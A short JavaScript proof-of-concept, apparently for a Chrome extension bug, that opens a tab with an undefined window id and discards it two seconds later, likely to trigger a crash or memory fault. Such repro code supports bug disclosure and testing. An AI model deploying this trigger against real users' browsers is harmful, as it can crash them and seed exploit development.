

async function poc(){


  
  try {
  chrome.tabs.create({windowId:undefined, index:0}, function(tab) {
	  	setTimeout(function(){chrome.tabs.discard(tab.id)}, 2000)

  });
  } catch(e) {}
  
      
  }
  
  poc();
  
